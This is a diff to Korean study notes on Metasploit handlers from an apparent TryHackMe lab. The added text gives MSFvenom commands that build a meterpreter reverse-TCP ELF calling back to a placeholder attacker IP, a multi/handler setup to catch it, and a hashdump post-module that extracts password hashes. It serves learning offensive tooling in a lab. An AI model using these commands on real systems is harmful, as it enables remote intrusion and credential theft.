@@ -102,8 +102,30 @@ Handlers
 reverse shell 을 사용하는 exploit 과 유사하게 MSFvenom payload 에 의해 생성된 incoming connection 을 받아야할 수도 있다. 
 exploit omdule 을 사용할 때 이 부분이 자동으로 exploit module 에 의해 처리가 된다. 이 때 reverse shell 을 구성할 때 어떻게 payload options title 이 보여질지 기억할 거다. catching a shell 이라는 용어가 일반적으로 target 으로부터 연결을 받는다는 용어로 사용된다. reverse shell 이나 meterpreter callbacks 들은 쉽게 handler 를 사용해서 catch 할 수 있음. 
 
+결국 handlers 를 이용해서 들어오는 connection 을 처리하는 것을 할 수 있고, 어떤 처리를 해줄지를 payload 로서 지정한다. 
 
-Generate the PHP shell using MSFvenom
-Start the Metasploit handler
-Execute the PHP shell
-MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.
+THM 에서 나온 문제에서는 MSFvenom 으로 만든 payload 를 target system 에 주입( 이 과정은 단순히 scp 나 wget 을 통해 처리함) 한 뒤 
+attacking machine 에서 handler 에 payload 를 등록해서 대기하도록 한다. 이 때 두 payload 는 한 쌍을 이룸. 
+
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost=10.10.x.x
+set lport=xxxx
+run
+```
+
+이후 target machine 에서 직접 payload 를 실행한다. 실제 시나리오에서는 이 부분도 어떤 메커니즘으로 실행되게 해야겠지
+그러면 meterpreter 가 뜨면서 session 이 연결됨. 
+위 과정에서 payload 를 지정안했다면 실패가 나게 되는데, 한 번이라도 실패가 생기면 이후 과정에도 문제가 발생하기때문에 다시 msfconsole 을 실행해야한다. 
+session 이 연결되면 background 로 숨기고 post module 을 실행하러 간다. 
+
+```
+background
+use post/linux/gather/hashdump
+set session 1
+run
+```
+
+
